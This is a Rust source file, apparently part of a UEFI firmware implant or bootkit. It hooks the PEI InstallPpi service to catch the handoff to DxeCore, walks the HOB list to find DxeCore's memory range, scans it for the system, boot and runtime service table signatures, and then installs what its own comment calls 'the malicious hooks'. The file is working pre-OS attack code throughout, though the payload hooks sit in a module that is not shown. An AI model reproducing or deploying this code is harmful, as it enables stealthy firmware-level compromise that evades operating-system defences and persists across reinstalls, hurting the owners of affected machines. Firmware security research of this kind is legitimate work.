use crate::efi::{
    Guid,
    BootServices,
    RuntimeServices,
    SystemTable,
    EfiResult,
    EfiStatus,
 };
use crate::pei::{
    HobGenericHeader,
    HobHandoffInfoTable,
    MemoryAllocationModule,
    PeiServices,
    PeiServicesPtr,
    PpiDescriptor,
};
use crate::hooks;
use core::fmt::Write;
use macros::guid;

static mut ORIGINAL_INSTALL_PPI: pei_fn!(*const PpiDescriptor) = install_ppi_hook;

pub unsafe fn hook_dxe_core(svc: &mut PeiServices) -> Result<(), EfiStatus> {
    // DxeCore signals the end of PEI by installing the EFI_DXE_IPL_PPI PPI.
    // By hooking InstallPpi, we can locate DxeCore by waiting for this PPI.
    debug!("hooking InstallPpi in EFI_PEI_SERVICES");
    ORIGINAL_INSTALL_PPI = svc.install_ppi;
    svc.install_ppi = install_ppi_hook;
    Ok(())
}

/// EFI_INSTALL_PPI hook is triggered as a callback after our PEIM exits.
extern "efiapi" fn install_ppi_hook(
            svc: PeiServicesPtr, mut ppi_list: *const PpiDescriptor) -> EfiStatus {
    // DxeCore loader installs EFI_PEI_END_OF_PEI_PPI to signal end of PEI.
    const PPI_DESCRIPTOR_TERMINATE_LIST: usize = 0x80000000;
    const PEI_END_OF_PEI_PPI: Guid = guid!("605ea650-c65c-42e1-ba8091a52ab618c6");

    // Iterate the PPIs until we find DxeCore, where we install a hook,
    // while passing execution to the original function for each PPI.
    unsafe { loop {
        let descriptor = &*ppi_list;
        if *descriptor.guid == PEI_END_OF_PEI_PPI {
            info!("trapped DxeLoadCore before DxeCore is called");
            if let Err(status) = find_and_hook_services(svc) {
                panic!("failed to hook EFI_BOOT_SERVICES: {:?}", status);
            }
        }
        // Use the original InstallPpi to properly install the PPI.
        let status = ORIGINAL_INSTALL_PPI(svc, ppi_list);
        if status != EfiStatus::Success {
            warn!("original InstallPpi returned {:?}", status);
            break status;
        }
        // Advance to the next descriptor.
        ppi_list = ppi_list.add(1);
        // The final entry of the PpiList is marked.
        if descriptor.flags & PPI_DESCRIPTOR_TERMINATE_LIST != 0 {
            break EfiStatus::Success;
        }
    }}
}

unsafe fn find_services(lo: *const u64, hi: *const u64)
        -> EfiResult<(&'static mut SystemTable,
                      &'static mut BootServices,
                      &'static mut RuntimeServices)> {
    // The service tables include a signature which we can search for.
    // The signatures will be aligned because of struct allocation.
    const EFI_BOOT_SERVICES_SIGNATURE: u64 = 0x56524553544f4f42;
    const EFI_RUNTIME_SERVICES_SIGNATURE: u64 = 0x56524553544e5552;
    const EFI_SYSTEM_TABLE_SIGNATURE: u64 = 0x5453595320494249;

    // Scan the HOB for the table signatures.
    debug!("scanning address range {:p}-{:p}", lo, hi);

    // EFI_SYSTEM_TABLE has its signature lying around for whatever reason
    // so we have to validate the matching object.
    let st = locate_table(lo, hi, EFI_SYSTEM_TABLE_SIGNATURE)?
        .cast::<SystemTable>().cast_mut().as_mut().unwrap();
    let system_table = if st.runtime_services as u64 > 0xffffffff  {
        let above_st = (st as *const _ as *const u64).add(1);
        locate_table(above_st, hi, EFI_SYSTEM_TABLE_SIGNATURE)?
            .cast::<SystemTable>().cast_mut().as_mut().unwrap()
    } else {
        st
    };
    info!("found EFI_SYSTEM_TABLE at {:p}", system_table);

    let boot_services = locate_table(lo, hi, EFI_BOOT_SERVICES_SIGNATURE)?
        .cast::<BootServices>().cast_mut().as_mut().unwrap();
    info!("found EFI_BOOT_SERVICES at {:p}", boot_services);

    let runtime_services = locate_table(lo, hi, EFI_RUNTIME_SERVICES_SIGNATURE)?
        .cast::<RuntimeServices>().cast_mut().as_mut().unwrap();
    info!("found EFI_RUNTIME_SERVICES at {:p}", runtime_services);

    Ok((system_table, boot_services, runtime_services))
}

unsafe fn find_and_hook_services(svc: PeiServicesPtr) -> EfiResult<()> {
    // DxeCore is mapped into the same address space so we can scan the HOBs
    // directly to find the boot, runtime, and system tables.

    // The DXE core has an associated EFI_HOB_MEMORY_ALLOCATION_MODULE HOB
    // which describes the loaded PE32's memory range.
    let hob = &*find_dxe_core_hob(svc)?;
    let lo = hob.alloc_header.memory_base_address as *const u64;
    let hi = lo.byte_add(hob.alloc_header.memory_length as usize);

    // Attempt to locate the tables within the HOB range.
    let (st, bs, rt) = find_services(lo, hi)?;

    debug!("verifying table contents are as expected");
    // gRT is initially filled out with placeholder functions.
    debug!("gRT->GetTime       = {:p}", rt.get_time);
    debug!("gRT->SetTime       = {:p}", rt.set_time);
    debug!("gRT->SetWakeupTime = {:p}", rt.set_wakeup_time);
    assert!(rt.get_time == rt.set_wakeup_time && rt.get_time != rt.set_time);
    info!("table contents have been successfully validated");

    // Install the malicious hooks into the tables.
    hooks::install_dxe_hooks(st, bs, rt)
}

unsafe fn find_dxe_core_hob(svc: &&mut PeiServices)
        -> EfiResult<*const MemoryAllocationModule> {
    // Retrieve the final HOB list for all PEIMs.
    let mut hob_list: *const HobGenericHeader = core::ptr::null();
    let status = (svc.get_hob_list)(svc, &mut hob_list);
    if status != EfiStatus::Success {
        error!("unable to call GetHobList service: {:?}", status);
        return Err(status);
    }

    const EFI_HOB_MEMORY_ALLOCATION_HOB: u16 = 0x0002;
    const HOB_MEMORY_ALLOC_MODULE_GUID: Guid = guid!("f8e21975-0899-4f58-a4be5525a9c6d77a");
    // MkePkg DxeCore GUID
    const DXE_CORE_GUID: Guid = guid!("d6a2cb7f-6a18-4e2f-b43b9920a733700a");

    // Iterate over the HOBs until we find the corresponding DxeCore HOB.
    debug!("searching for {} HOB", DXE_CORE_GUID);

    // The first HOB is the PHIT which contains the PA of the last HOB.
    let phit = hob_list.cast::<HobHandoffInfoTable>().as_ref().unwrap();
    hob_list = hob_list.byte_add(phit.header.hob_length.into());

    // Iterate over the remaining HOBs until we find our target (or list ends).
    while hob_list != phit.end_of_hob_list {
        if (*hob_list).hob_type == EFI_HOB_MEMORY_ALLOCATION_HOB {
            let alloc_hob = hob_list.cast::<MemoryAllocationModule>();
            // The allocation HOBs are distinguished by a GUID in a header.
            if (*alloc_hob).alloc_header.name == HOB_MEMORY_ALLOC_MODULE_GUID {
                if (*alloc_hob).module_name == DXE_CORE_GUID {
                    info!("found DxeCore HOB at {:p}", hob_list);
                    return Ok(alloc_hob);
                }
            }
        }
        // Advance to next HOB in the list.
        hob_list = hob_list.byte_add((*hob_list).hob_length.into());
    }
    Err(EfiStatus::NotFound)
}

pub unsafe fn locate_table(mut addr: *const u64, hi: *const u64, sig: u64)
        -> EfiResult<*const u64> {
    while addr < hi {
        if *addr == sig {
            return Ok(addr)
        }
        addr = addr.add(1);
    }
    Err(EfiStatus::NotFound)
}

